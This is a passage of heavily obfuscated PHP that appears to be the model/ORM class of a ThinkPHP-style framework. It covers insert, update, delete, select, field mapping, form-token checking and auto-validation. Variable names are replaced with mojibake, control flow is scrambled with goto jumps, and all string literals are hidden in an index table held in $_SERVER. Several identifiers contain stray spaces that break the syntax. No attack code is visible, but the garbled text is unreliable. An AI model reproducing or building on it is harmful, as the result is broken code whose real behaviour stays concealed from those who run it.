array($Bõ—¢ËÏ³¦, $B÷¢†¢Ÿ¥)); if (!is_null($E¾†²Ì£Éç) && $E¾†²Ì£Éç !== !1) { return $E¾†²Ì£Éç; } } goto CÚ—Ñê·©; Fß¯‹Œİ¤: $c†Åš‚É³ç =& $_SERVER[Æ]; $B÷¢†¢Ÿ¥ = func_get_args(); $B¬ÎŒÈÅ¤ = array_shift($B÷¢†¢Ÿ¥); goto bØàñÚ¾Ô»; CÚ—Ñê·©: $e¡ôß­Ë³ = call_user_func_array(array($this, $B¬ÎŒÈÅ¤), $B÷¢†¢Ÿ¥); if (method_exists($this, $c†Åš‚É³ç[256])) { $E¾†²Ì£Éç = call_user_func_array(array($this, $c†Åš‚É³ç[257]), array($Bõ—¢ËÏ³¦, $B÷¢†¢Ÿ¥, $e¡ôß­Ë³)); if ($E¾†²Ì£Éç) { return $E¾†²Ì£Éç; } } return $e¡ôß­Ë³; goto Fœ•°‹ˆêğ; bØàñÚ¾Ô»: $Bõ—¢ËÏ³¦ = $B¬ÎŒÈÅ¤; if (is_array($B¬ÎŒÈÅ¤)) { $Bõ—¢ËÏ³¦ = $B¬ÎŒÈÅ¤[1]; $B¬ÎŒÈÅ¤ = $B¬ÎŒÈÅ¤[0]; } $F®ª®À° ° = count($B÷¢†¢Ÿ¥) - 1; goto C„ãÙŞä”; Fœ•°‹ˆêğ: } protected function _initialize() { } protected function _facade($DŸ¦‰âìãÇ) { $eßøËĞ ›— =& $_SERVER[Æ]; if (!empty($this->fields)) { foreach ($DŸ¦‰âìãÇ as $bŠˆé÷Š¥Ó => $C¯ğÌÅ·º) { if (!in_array($bŠˆé÷Š¥Ó, $this->fields, !0)) { unset($DŸ¦‰âìãÇ[$bŠˆé÷Š¥Ó]); } elseif (is_scalar($C¯ğÌÅ·º)) { $this->_parseType($DŸ¦‰âìãÇ, $bŠˆé÷Š¥Ó); } } } if (!empty($this->options[$eßøËĞ ›—[258]])) { $DŸ¦‰âìãÇ = array_map($this->options[$eßøËĞ ›—[258]], $DŸ¦‰âìãÇ); unset($this->options[$eßøËĞ ›—[258]]); } $this->_beforeWrite($DŸ¦‰âìãÇ); return $DŸ¦‰âìãÇ; } protected function _beforeWrite(&$EÂ³ËÜêÈ) { } public function add($bÓÍ¯™Ô = '', $Fí¼‰´¹¨Å = array(), $CğŠÛ½×ˆ• = false) { goto DÅùã˜Œ¤Ó; CÆ…Åã‘½¿: return $D­œ»Ò¸•; goto f¾…­º®ò•; DÅùã˜Œ¤Ó: if (empty($bÓÍ¯™Ô)) { if (!empty($this->data)) { $bÓÍ¯™Ô = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Æ][259]); return !1; } } $Fí¼‰´¹¨Å = $this->_parseOptions($Fí¼‰´¹¨Å); $bÓÍ¯™Ô = $this->_facade($bÓÍ¯™Ô); goto Aâè¦º‘ï; Aâè¦º‘ï: if (!1 === $this->_beforeInsert($bÓÍ¯™Ô, $Fí¼‰´¹¨Å)) { return !1; } $D­œ»Ò¸• = $this->db->insert($bÓÍ¯™Ô, $Fí¼‰´¹¨Å, $CğŠÛ½×ˆ•); if (!1 !== $D­œ»Ò¸•) { $dÍ„ÚŒäÅï = $this->getLastInsID(); if ($dÍ„ÚŒäÅï) { $bÓÍ¯™Ô[$this->getPk()] = $dÍ„ÚŒäÅï; $this->_after_insert($bÓÍ¯™Ô, $Fí¼‰´¹¨Å); return $dÍ„ÚŒäÅï; } $this->_after_insert($bÓÍ¯™Ô, $Fí¼‰´¹¨Å); } goto CÆ…Åã‘½¿; f¾…­º®ò•: } protected function _beforeInsert(&$Dï®½‘¹ê, $fš–ªŞÔå›) { } protected function _after_insert($dƒ¨µÈ»ªœ, $b¹Ò’»½) { } public function addAll($fÕù²éÁŠ™, $dˆ¡‰î¦º÷ = array(), $aŞøŠ„À = false) { goto c—‚Óó³›Ó; AµÌ£è‚¼Û: return $d¢‰‹×Æê¬; goto BğùøŠ»öÌ; D‡õÀééÍ©: foreach ($fÕù²éÁŠ™ as $e„Š¨Ïö¤¦ => $c¦ ¹ÔÅÍ) { $fÕù²éÁŠ™[$e„Š¨Ïö¤¦] = $this->_facade($c¦ ¹ÔÅÍ); } if (method_exists($this->db, $A´ºœ•­ªİ[260])) { $d¢‰‹×Æê¬ = $this->db->insertAll($fÕù²éÁŠ™, $dˆ¡‰î¦º÷, $aŞøŠ„À); } else { $this->startTrans(); foreach ($fÕù²éÁŠ™ as $e„Š¨Ïö¤¦ => $c¦ ¹ÔÅÍ) { $d¢‰‹×Æê¬ = $this->db->insert($c¦ ¹ÔÅÍ, $dˆ¡‰î¦º÷, $aŞøŠ„À); } $this->commit(); } if (!1 !== $d¢‰‹×Æê¬) { $CÕ‘èÃÛÈ† = $this->getLastInsID(); if ($CÕ‘èÃÛÈ†) { return $CÕ‘èÃÛÈ†; } } goto AµÌ£è‚¼Û; c—‚Óó³›Ó: $A´ºœ•­ªİ =& $_SERVER[Æ]; if (empty($fÕù²éÁŠ™)) { $this->error = think_lang($A´ºœ•­ªİ[259]); return !1; } $dˆ¡‰î¦º÷ = $this->_parseOptions($dˆ¡‰î¦º÷); goto D‡õÀééÍ©; BğùøŠ»öÌ: } public function selectAdd($b´ëÃ»…ê = '', $a‚ñÔ„êê = '', $a¿ÕÄ·ÀôÛ = array()) { $e¬¢ÕÏ÷Ñ =& $_SERVER[Æ]; $a¿ÕÄ·ÀôÛ = $this->_parseOptions($a¿ÕÄ·ÀôÛ); if (!1 === ($Eï Ï’‚î = $this->db->selectInsert($b´ëÃ»…ê ? $b´ëÃ»…ê : $a¿ÕÄ·ÀôÛ[$e¬¢ÕÏ÷Ñ[261]], $a‚ñÔ„êê ? $a‚ñÔ„êê : $this->getTableName(), $a¿ÕÄ·ÀôÛ))) { $this->error = think_lang($e¬¢ÕÏ÷Ñ[262]); return !1; } else { return $Eï Ï’‚î; } } public function save($CÛºˆĞîÄÏ = '', $FÄ¤£„¾ñ = array()) { goto aß …ß„¶Ë; E‡¦±¯õ…š: if (is_array($FÄ¤£„¾ñ[$A×³«ÊÒá“[263]]) && isset($FÄ¤£„¾ñ[$A×³«ÊÒá“[263]][$Aê±ßøØ©“])) { $dŸŠŸ×ÒÙé = $FÄ¤£„¾ñ[$A×³«ÊÒá“[263]][$Aê±ßøØ©“]; } if (!1 === $this->_beforeUpdate($CÛºˆĞîÄÏ, $FÄ¤£„¾ñ)) { return !1; } $BŸİ’½İĞ­ = $this->db->update($CÛºˆĞîÄÏ, $FÄ¤£„¾ñ); goto E²Êº•ëÃ; b‚À¿†¸¶: $FÄ¤£„¾ñ = $this->_parseOptions($FÄ¤£„¾ñ); $Aê±ßøØ©“ = $this->getPk(); if (!isset($FÄ¤£„¾ñ[$A×³«ÊÒá“[263]])) { if (isset($CÛºˆĞîÄÏ[$Aê±ßøØ©“])) { $FÀ†’ã®Û[$Aê±ßøØ©“] = $CÛºˆĞîÄÏ[$Aê±ßøØ©“]; $FÄ¤£„¾ñ[$A×³«ÊÒá“[263]] = $FÀ†’ã®Û; unset($CÛºˆĞîÄÏ[$Aê±ßøØ©“]); } else { $this->error = think_lang($A×³«ÊÒá“[262]); return !1; } } goto E‡¦±¯õ…š; aß …ß„¶Ë: $A×³«ÊÒá“ =& $_SERVER[Æ]; if (empty($CÛºˆĞîÄÏ)) { if (!empty($this->data)) { $CÛºˆĞîÄÏ = $this->data; $this->data = array(); } else { $this->error = think_lang($A×³«ÊÒá“[259]); return !1; } } $CÛºˆĞîÄÏ = $this->_facade($CÛºˆĞîÄÏ); goto b‚À¿†¸¶; E²Êº•ëÃ: if (!1 !== $BŸİ’½İĞ­) { if (isset($dŸŠŸ×ÒÙé)) { $CÛºˆĞîÄÏ[$Aê±ßøØ©“] = $dŸŠŸ×ÒÙé; } $this->_afterUpdate($CÛºˆĞîÄÏ, $FÄ¤£„¾ñ); } return $BŸİ’½İĞ­; goto eÛìÕ¸¥°«; eÛìÕ¸¥°«: } protected function _beforeUpdate(&$a§ÄÒ¨•ç, $cÂâ÷Öá¼ô) { } protected function _afterUpdate($F…õ·©İ›è, $AÕœÈ´í¿‹) { } public function delete($FÓğÃö¡Ã– = array()) { goto dÌÒÍ™³â; dÌÒÍ™³â: $aí®­Ù–Ï¥ =& $_SERVER[Æ]; if (empty($FÓğÃö¡Ã–) && empty($this->options[$aí®­Ù–Ï¥[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $AÁâ¨ÒŠùÔ = $this->getPk(); goto bò£«ÁÊ¯‘; dÇšÔ¬ŠïË: $Bœ‘õº„Àê = $this->db->delete($FÓğÃö¡Ã–); if (!1 !== $Bœ‘õº„Àê) { $FÍë®Ó­‡® = array(); if (isset($eö©îˆŠ»)) { $FÍë®Ó­‡®[$AÁâ¨ÒŠùÔ] = $eö©îˆŠ»; } $this->_after_delete($FÍë®Ó­‡®, $FÓğÃö¡Ã–); } return $Bœ‘õº„Àê; goto B…¢£åÁ¨; bò£«ÁÊ¯‘: if (is_numeric($FÓğÃö¡Ã–) || is_string($FÓğÃö¡Ã–)) { if (strpos($FÓğÃö¡Ã–, $aí®­Ù–Ï¥[47])) { $Cè¿İŞ½åĞ[$AÁâ¨ÒŠùÔ] = array($aí®­Ù–Ï¥[264], $FÓğÃö¡Ã–); } else { $Cè¿İŞ½åĞ[$AÁâ¨ÒŠùÔ] = $FÓğÃö¡Ã–; } $this->options[$aí®­Ù–Ï¥[263]] = $Cè¿İŞ½åĞ; } $FÓğÃö¡Ã– = $this->_parseOptions(); if (is_array($FÓğÃö¡Ã–[$aí®­Ù–Ï¥[263]]) && isset($FÓğÃö¡Ã–[$aí®­Ù–Ï¥[263]][$AÁâ¨ÒŠùÔ])) { $eö©îˆŠ» = $FÓğÃö¡Ã–[$aí®­Ù–Ï¥[263]][$AÁâ¨ÒŠùÔ]; } goto dÇšÔ¬ŠïË; B…¢£åÁ¨: } protected function _after_delete($Fì§‹ØŒ×, $B¥Òã¨°¦½) { } public function select($c¶Ôéí¸ÇÂ = array()) { goto f”ƒÓè„Šè; Eƒã´ÇŸŞø: $this->_afterSelect($BÚö«öÃ©Ú, $c¶Ôéí¸ÇÂ); return $BÚö«öÃ©Ú; goto c Áğ¶˜Ş†; f”ƒÓè„Šè: $aô“ñ—ŞÜ£ =& $_SERVER[Æ]; if (is_string($c¶Ôéí¸ÇÂ) || is_numeric($c¶Ôéí¸ÇÂ)) { $C¯õÍ÷©· = $this->getPk(); if (strpos($c¶Ôéí¸ÇÂ, $aô“ñ—ŞÜ£[47])) { $cñó‚Ööã‰[$C¯õÍ÷©·] = array($aô“ñ—ŞÜ£[264], $c¶Ôéí¸ÇÂ); } else { $cñó‚Ööã‰[$C¯õÍ÷©·] = $c¶Ôéí¸ÇÂ; } $this->options[$aô“ñ—ŞÜ£[263]] = $cñó‚Ööã‰; } elseif (!1 === $c¶Ôéí¸ÇÂ) { $c¶Ôéí¸ÇÂ = $this->_parseOptions(); return $aô“ñ—ŞÜ£[265] . $this->db->buildSelectSql($c¶Ôéí¸ÇÂ) . $aô“ñ—ŞÜ£[266]; } $c¶Ôéí¸ÇÂ = $this->_parseOptions(); goto C‚·”¢Ñáø; C‚·”¢Ñáø: $BÚö«öÃ©Ú = $this->db->select($c¶Ôéí¸ÇÂ); if (!1 === $BÚö«öÃ©Ú) { return !1; } if (empty($BÚö«öÃ©Ú)) { return null; } goto Eƒã´ÇŸŞø; c Áğ¶˜Ş†: } protected function _afterSelect(&$E—ŠğßË´À, $DÀâÀ †Û) { } public function buildSql($DÇİÃ ·öƒ = array()) { $E±„¤ÚÒù‰ =& $_SERVER[Æ]; $DÇİÃ ·öƒ = $this->_parseOptions($DÇİÃ ·öƒ); return $E±„¤ÚÒù‰[265] . $this->db->buildSelectSql($DÇİÃ ·öƒ) . $E±„¤ÚÒù‰[266]; } public function optionsValue($FÙ‘ÈŞ—Ğ = null) { if (is_null($FÙ‘ÈŞ—Ğ)) { return $this->options; } elseif (is_array($FÙ‘ÈŞ—Ğ)) { $this->options = array_merge($this->options, $FÙ‘ÈŞ—Ğ); } } protected function _parseOptions($a¸ŠÕŸ”ö¶ = array()) { goto dö…ê‰ÛÓ; dö…ê‰ÛÓ: $E‰Ê’âì¤¯ =& $_SERVER[Æ]; if (is_array($a¸ŠÕŸ”ö¶)) { $a¸ŠÕŸ”ö¶ = array_merge($this->options, $a¸ŠÕŸ”ö¶); } $this->options = array(); goto D»¿”Û¼ƒ; D»¿”Û¼ƒ: if (!isset($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[267]])) { $a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[267]] = $this->getTableName(); $BÔ°•™¹¦Ù = $this->fields; } else { $BÔ°•™¹¦Ù = $this->getDbFields(); } if (!empty($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[268]])) { $a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[267]] .= $E‰Ê’âì¤¯[50] . $a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[268]]; } $a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[269]] = $this->name; goto eéƒš‰Ùˆ; eéƒš‰Ùˆ: if (isset($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[263]]) && is_array($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[263]]) && !empty($BÔ°•™¹¦Ù) && !isset($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[270]]) && !isset($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[267]])) { foreach ($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[263]] as $EŒášŒ¾œÛ => $Aá‘ÔæªÉ) { $EŒášŒ¾œÛ = trim($EŒášŒ¾œÛ); if (in_array($EŒášŒ¾œÛ, $BÔ°•™¹¦Ù, !0)) { if (is_scalar($Aá‘ÔæªÉ)) { $this->_parseType($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[263]], $EŒášŒ¾œÛ); } } elseif (!is_numeric($EŒášŒ¾œÛ) && $E‰Ê’âì¤¯[70] != substr($EŒášŒ¾œÛ, 0, 1) && !1 === strpos($EŒášŒ¾œÛ, $E‰Ê’âì¤¯[91]) && !1 === strpos($EŒášŒ¾œÛ, $E‰Ê’âì¤¯[248]) && !1 === strpos($EŒášŒ¾œÛ, $E‰Ê’âì¤¯[271]) && !1 === strpos($EŒášŒ¾œÛ, $E‰Ê’âì¤¯[272])) { unset($a¸ŠÕŸ”ö¶[$E‰Ê’âì¤¯[263]][$EŒášŒ¾œÛ]); } } } $this->_options_filter($a¸ŠÕŸ”ö¶); return $a¸ŠÕŸ”ö¶; goto c²Ú…½¾Ÿ; c²Ú…½¾Ÿ: } protected function _options_filter(&$D‘»…ÒÍ ²) { } protected function _parseType(&$AÈÁ¢†ç Ä, $E÷ŠËãµÑ®) { $F‚¥æé‹à– =& $_SERVER[Æ]; if (empty($this->options[$F‚¥æé‹à–[273]][$F‚¥æé‹à–[4] . $E÷ŠËãµÑ®])) { $F¯«ë­Â× = strtolower($this->fields[$F‚¥æé‹à–[240]][$E÷ŠËãµÑ®]); if (!1 !== strpos($F¯«ë­Â×, $F‚¥æé‹à–[274])) { } elseif (!1 === strpos($F¯«ë­Â×, $F‚¥æé‹à–[275]) && !1 !== strpos($F¯«ë­Â×, $F‚¥æé‹à–[276])) { $AÈÁ¢†ç Ä[$E÷ŠËãµÑ®] = intval($AÈÁ¢†ç Ä[$E÷ŠËãµÑ®]); } elseif (!1 !== strpos($F¯«ë­Â×, $F‚¥æé‹à–[277]) || !1 !== strpos($F¯«ë­Â×, $F‚¥æé‹à–[278])) { $AÈÁ¢†ç Ä[$E÷ŠËãµÑ®] = floatval($AÈÁ¢†ç Ä[$E÷ŠËãµÑ®]); } elseif (!1 !== strpos($F¯«ë­Â×, $F‚¥æé‹à–[279])) { $AÈÁ¢†ç Ä[$E÷ŠËãµÑ®] = (bool) $AÈÁ¢†ç Ä[$E÷ŠËãµÑ®]; } } } public function find($Eƒâ¯¸Ò° = array()) { goto B³‘í×Á„É; B³‘í×Á„É: $C‘›†âÎò‘ =& $_SERVER[Æ]; if (is_numeric($Eƒâ¯¸Ò°) || is_string($Eƒâ¯¸Ò°)) { $Eªù„Ó”µÅ[$this->getPk()] = intval($Eƒâ¯¸Ò°); $this->options[$C‘›†âÎò‘[263]] = $Eªù„Ó”µÅ; } $this->options[$C‘›†âÎò‘[280]] = 1; goto DÑ¤È„´Ú; DÂÚö Ü: if (empty($cæŠïŠ‚Ë³)) { return null; } $this->data = $cæŠïŠ‚Ë³[0]; $this->_afterFind($this->data, $Eƒâ¯¸Ò°); goto e‘®Ò†£Ù±; DÑ¤È„´Ú: $Eƒâ¯¸Ò° = $this->_parseOptions(); $cæŠïŠ‚Ë³ = $this->db->select($Eƒâ¯¸Ò°); if (!1 === $cæŠïŠ‚Ë³) { return !1; } goto DÂÚö Ü; e‘®Ò†£Ù±: if (!empty($this->options[$C‘›†âÎò‘[281]])) { return $this->returnResult($this->data, $this->options[$C‘›†âÎò‘[281]]); } return $this->data; goto A²ÊÇÎï…Ò; A²ÊÇÎï…Ò: } protected function _afterFind(&$aù¶ù¢½ã, $Fàó»Ê¡êÉ) { } protected function returnResult($f¯ÃÎ±½”Œ, $fÓ‘å²°ØÉ = '') { $f£ã°âöä =& $_SERVER[Æ]; if ($fÓ‘å²°ØÉ) { if (is_callable($fÓ‘å²°ØÉ)) { return call_user_func($fÓ‘å²°ØÉ, $f¯ÃÎ±½”Œ); } switch (strtolower($fÓ‘å²°ØÉ)) { case $f£ã°âöä[282]: return json_encode($f¯ÃÎ±½”Œ); case $f£ã°âöä[283]: return xml_encode($f¯ÃÎ±½”Œ); } } return $f¯ÃÎ±½”Œ; } public function parseFieldsMap($e¾ÜìÀğö, $a÷í÷ ®‡ô = 1) { if (!empty($this->_map)) { foreach ($this->_map as $e¾Ñ¾Ô‹ª => $FáÙ×šËÖ) { if ($a÷í÷ ®‡ô == 1) { if (isset($e¾ÜìÀğö[$FáÙ×šËÖ])) { $e¾ÜìÀğö[$e¾Ñ¾Ô‹ª] = $e¾ÜìÀğö[$FáÙ×šËÖ]; unset($e¾ÜìÀğö[$FáÙ×šËÖ]); } } else { if (isset($e¾ÜìÀğö[$e¾Ñ¾Ô‹ª])) { $e¾ÜìÀğö[$FáÙ×šËÖ] = $e¾ÜìÀğö[$e¾Ñ¾Ô‹ª]; unset($e¾ÜìÀğö[$e¾Ñ¾Ô‹ª]); } } } } return $e¾ÜìÀğö; } public function setField($Fãç‘›ïò, $F›¨ÊÌêˆ = '') { if (is_array($Fãç‘›ïò)) { $Dˆ¾õÆ· = $Fãç‘›ïò; } else { $Dˆ¾õÆ·[$Fãç‘›ïò] = $F›¨ÊÌêˆ; } return $this->save($Dˆ¾õÆ·); } public function setAdd($fİè”ÄÎ², $eÔñÓÓ·Ñã = 1) { $CìéèØä“Ã =& $_SERVER[Æ]; $c—õÈÆäé± = $fİè”ÄÎ² . $CìéèØä“Ã[284] . $eÔñÓÓ·Ñã; if ($eÔñÓÓ·Ñã < 0) { $c—õÈÆäé± = $fİè”ÄÎ² . $eÔñÓÓ·Ñã; } return $this->setField($fİè”ÄÎ², array($CìéèØä“Ã[285], $c—õÈÆäé±)); } public function getField($E½á¸¼ñ¾—, $eä£ÊÛ›ğ = null) { $D³Ÿ›Üî¾¯ =& $_SERVER[Æ]; $FŞåä°ö[$D³Ÿ›Üî¾¯[261]] = $E½á¸¼ñ¾—; $FŞåä°ö = $this->_parseOptions($FŞåä°ö); $E½á¸¼ñ¾— = trim($E½á¸¼ñ¾—); if (strpos($E½á¸¼ñ¾—, $D³Ÿ›Üî¾¯[47])) { if (!isset($FŞåä°ö[$D³Ÿ›Üî¾¯[280]])) { $FŞåä°ö[$D³Ÿ›Üî¾¯[280]] = is_numeric($eä£ÊÛ›ğ) ? $eä£ÊÛ›ğ : $D³Ÿ›Üî¾¯[33]; } $DÅÔ‚¥ªÇ = $this->db->select($FŞåä°ö); if (!empty($DÅÔ‚¥ªÇ)) { goto FãÔ­³Î“µ; FãÔ­³Î“µ: $AÀ—£Âø¡¶ = explode($D³Ÿ›Üî¾¯[47], $E½á¸¼ñ¾—); $E½á¸¼ñ¾— = array_keys($DÅÔ‚¥ªÇ[0]); $a¢åˆÎ„…Ò = array_shift($E½á¸¼ñ¾—); goto aÅÇÓÇ¶õÎ; aÅÇÓÇ¶õÎ: $EìÇ‰œñ¹ê = array_shift($E½á¸¼ñ¾—); $b‘Ù·¯Ä¾Ï = array(); $cˆ¦Ä·ËÙ® = count($AÀ—£Âø¡¶); goto FÃæ’å»„É; FÃæ’å»„É: foreach ($DÅÔ‚¥ªÇ as $aé©„àÓôö) { $C”É­ˆ¡Ğ = $aé©„àÓôö[$a¢åˆÎ„…Ò]; if (2 == $cˆ¦Ä·ËÙ®) { $b‘Ù·¯Ä¾Ï[$C”É­ˆ¡Ğ] = $aé©„àÓôö[$EìÇ‰œñ¹ê]; } else { $b‘Ù·¯Ä¾Ï[$C”É­ˆ¡Ğ] = is_string($eä£ÊÛ›ğ) ? implode($eä£ÊÛ›ğ, $aé©„àÓôö) : $aé©„àÓôö; } } return $b‘Ù·¯Ä¾Ï; goto b ¶“¾“ª¯; b ¶“¾“ª¯: } } else { if (!0 !== $eä£ÊÛ›ğ) { $FŞåä°ö[$D³Ÿ›Üî¾¯[280]] = is_numeric($eä£ÊÛ›ğ) ? $eä£ÊÛ›ğ : 1; } if ($eä£ÊÛ›ğ === $D³Ÿ›Üî¾¯[243]) { unset($FŞåä°ö[$D³Ÿ›Üî¾¯[280]]); } $aé©„àÓôö = $this->db->select($FŞåä°ö); if (!empty($aé©„àÓôö)) { if ($eä£ÊÛ›ğ === $D³Ÿ›Üî¾¯[243]) { return reset($aé©„àÓôö[0]); } if (!0 !== $eä£ÊÛ›ğ && 1 == $FŞåä°ö[$D³Ÿ›Üî¾¯[280]]) { return reset($aé©„àÓôö[0]); } foreach ($aé©„àÓôö as $Cğï§–ÜæĞ) { $c ×ØÉË†[] = $Cğï§–ÜæĞ[$E½á¸¼ñ¾—]; } return $c ×ØÉË†; } } return null; } public function create($AÃ¹óê˜á¶ = '', $cĞÒÍÍ×È™ = '') { goto Eµ‡†ƒ«±¬; DîĞ‡›–ì: return $AÃ¹óê˜á¶; goto B°Ê»¨¢æÄ; BŠ¾ç»ÃÇÒ: if (isset($AŸÔÉÚŸ†Ü)) { if (is_string($AŸÔÉÚŸ†Ü)) { $AŸÔÉÚŸ†Ü = explode($EÈ‚Ğ¸¡…è[47], $AŸÔÉÚŸ†Ü); } if (think_config($EÈ‚Ğ¸¡…è[286])) { $AŸÔÉÚŸ†Ü[] = think_config($EÈ‚Ğ¸¡…è[287]); } foreach ($AÃ¹óê˜á¶ as $BñÔ¹æ–ÇØ => $aóÈ­ÂÚ¹ˆ) { if (!in_array($BñÔ¹æ–ÇØ, $AŸÔÉÚŸ†Ü)) { unset($AÃ¹óê˜á¶[$BñÔ¹æ–ÇØ]); } } } if (!$this->autoValidation($AÃ¹óê˜á¶, $cĞÒÍÍ×È™)) { return !1; } if (!$this->autoCheckToken($AÃ¹óê˜á¶)) { $this->error = think_lang($EÈ‚Ğ¸¡…è[288]); return !1; } goto e‚ÁçÄ¿Óù; Eµ‡†ƒ«±¬: $EÈ‚Ğ¸¡…è =& $_SERVER[Æ]; if (empty($AÃ¹óê˜á¶)) { $AÃ¹óê˜á¶ = $_POST; } elseif (is_object($AÃ¹óê˜á¶)) { $AÃ¹óê˜á¶ = get_object_vars($AÃ¹óê˜á¶); } if (empty($AÃ¹óê˜á¶) || !is_array($AÃ¹óê˜á¶)) { $this->error = think_lang($EÈ‚Ğ¸¡…è[259]); return !1; } goto fœåØê—Á‰; e‚ÁçÄ¿Óù: if ($this->autoCheckFields) { $AŸÔÉÚŸ†Ü = $this->getDbFields(); foreach ($AÃ¹óê˜á¶ as $BñÔ¹æ–ÇØ => $aóÈ­ÂÚ¹ˆ) { if (!in_array($BñÔ¹æ–ÇØ, $AŸÔÉÚŸ†Ü)) { unset($AÃ¹óê˜á¶[$BñÔ¹æ–ÇØ]); } elseif (MAGIC_QUOTES_GPC && is_string($aóÈ­ÂÚ¹ˆ)) { $AÃ¹óê˜á¶[$BñÔ¹æ–ÇØ] = stripslashes($aóÈ­ÂÚ¹ˆ); } } } $this->autoOperation($AÃ¹óê˜á¶, $cĞÒÍÍ×È™); $this->data = $AÃ¹óê˜á¶; goto DîĞ‡›–ì; fœåØê—Á‰: $AÃ¹óê˜á¶ = $this->parseFieldsMap($AÃ¹óê˜á¶, 0); $cĞÒÍÍ×È™ = $cĞÒÍÍ×È™ ? $cĞÒÍÍ×È™ : (!empty($AÃ¹óê˜á¶[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$EÈ‚Ğ¸¡…è[261]])) { $AŸÔÉÚŸ†Ü = $this->options[$EÈ‚Ğ¸¡…è[261]]; unset($this->options[$EÈ‚Ğ¸¡…è[261]]); } elseif ($cĞÒÍÍ×È™ == THINK_MODEL_INSERT && isset($this->insertFields)) { $AŸÔÉÚŸ†Ü = $this->insertFields; } elseif ($cĞÒÍÍ×È™ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $AŸÔÉÚŸ†Ü = $this->updateFields; } goto BŠ¾ç»ÃÇÒ; B°Ê»¨¢æÄ: } public function autoCheckToken($a‡õ´î¸Í©) { $dÜŞİÈÉ¶ =& $_SERVER[Æ]; if (isset($this->options[$dÜŞİÈÉ¶[289]]) && !$this->options[$dÜŞİÈÉ¶[289]]) { return !0; } if (think_config($dÜŞİÈÉ¶[286])) { $CËáôé…¼ = think_config($dÜŞİÈÉ¶[287]); if (!isset($a‡õ´î¸Í©[$CËáôé…¼]) || Session::get($CËáôé…¼)) { return !1; } list($d’æ­ÑÎƒ¦, $eÛÒ™ˆã) = explode($dÜŞİÈÉ¶[70], $a‡õ´î¸Í©[$CËáôé…¼]); if ($eÛÒ™ˆã && Session::get($CËáôé…¼ . $dÜŞİÈÉ¶[91] . $d’æ­ÑÎƒ¦) === $eÛÒ™ˆã) { Session::remove($CËáôé…¼ . $dÜŞİÈÉ¶[91] . $d’æ­ÑÎƒ¦); return !0; } if (think_config($dÜŞİÈÉ¶[290])) { Session::remove($CËáôé…¼ . $dÜŞİÈÉ¶[91] . $d’æ­ÑÎƒ¦); } return !1; } return !0; } public function regex($b°³‘·µô, $CĞ¸µ‹½¹) { $E‹£­â˜– =& $_SERVER[Æ]; $f³ßù–Å°„ = array($E‹£­â˜–[291] => $E‹£­â˜–[292], $E‹£­â˜–[293] => $E‹£­â˜–[294], $E‹£­â˜–[295] => $E‹£­â˜–[296], $E‹£­â˜–[297] => $E‹£­â˜–[298], $E‹£­â˜–[299] => $E‹£­â˜–[300], $E‹£­â˜–[301] => $E‹£­â˜–[302], $E‹£­â˜–[303] => $E‹£­â˜–[304], $E‹£­â˜–[278] => $E‹£­â˜–[305], $E‹£­â˜–[306] => $E‹£­â˜–[307]); if (isset($f³ßù–Å°„[strtolower($CĞ¸µ‹½¹)])) { $CĞ¸µ‹½¹ = $f³ßù–Å°„[strtolower($CĞ¸µ‹½¹)]; } return preg_match($CĞ¸µ‹½¹, $b°³‘·µô) === 1; } private function autoOperation(&$eÍçª¦¢â, $bÅ‡´ƒ–…) { $Bçä¹¨ßË¼ =& $_SERVER[Æ]; if (!empty($this->options[$Bçä¹¨ßË¼[308]])) { $dê•Ã™É—ã = $this->options[$Bçä¹¨ßË¼[308]]; unset($this->options[$Bçä¹¨ßË¼[308]]); } elseif (!empty($this->_auto)) { $dê•Ã™É—ã = $this->_auto; } if (isset($dê•Ã™É—ã)) { foreach ($dê•Ã™É—ã as $AÍãİ–ß) { if (empty($AÍãİ–ß[2])) { $AÍãİ–ß[2] = THINK_MODEL_INSERT; } if ($bÅ‡´ƒ–… == $AÍãİ–ß[2] || $AÍãİ–ß[2] == THINK_MODEL_BOTH) { switch (trim($AÍãİ–ß[3])) { case $Bçä¹¨ßË¼[309]: case $Bçä¹¨ßË¼[310]: $Fô÷”®„• = isset($AÍãİ–ß[4]) ? (array) $AÍãİ–ß[4] : array(); if (isset($eÍçª¦¢â[$AÍãİ–ß[0]])) { array_unshift($Fô÷”®„•, $eÍçª¦¢â[$AÍãİ–ß[0]]); } if ($Bçä¹¨ßË¼[309] == $AÍãİ–ß[3]) { $eÍçª¦¢â[$AÍãİ–ß[0]] = call_user_func_array($AÍãİ–ß[1], $Fô÷”®„•); } else { $eÍçª¦¢â[$AÍãİ–ß[0]] = call_user_func_array(array(&$this, $AÍãİ–ß[1]), $Fô÷”®„•); } break; case $Bçä¹¨ßË¼[261]: $eÍçª¦¢â[$AÍãİ–ß[0]] = $eÍçª¦¢â[$AÍãİ–ß[1]]; break; case $Bçä¹¨ßË¼[311]: if ($Bçä¹¨ßË¼[33] === $eÍçª¦¢â[$AÍãİ–ß[0]]) { unset($eÍçª¦¢â[$AÍãİ–ß[0]]); } break; case $Bçä¹¨ßË¼[312]: default: $eÍçª¦¢â[$AÍãİ–ß[0]] = $AÍãİ–ß[1]; } if (!1 === $eÍçª¦¢â[$AÍãİ–ß[0]]) { unset($eÍçª¦¢â[$AÍãİ–ß[0]]); } } } } return $eÍçª¦¢â; } protected function autoValidation($Aí“ë÷»ğ®, $dšóŠéóò—) { $C²Ÿ‰ÍÍÛì =& $_SERVER[Æ]; if (!empty($this->options[$C²Ÿ‰ÍÍÛì[313]])) { $añç¯»›Ë = $this->options[$C²Ÿ‰ÍÍÛì[313]]; 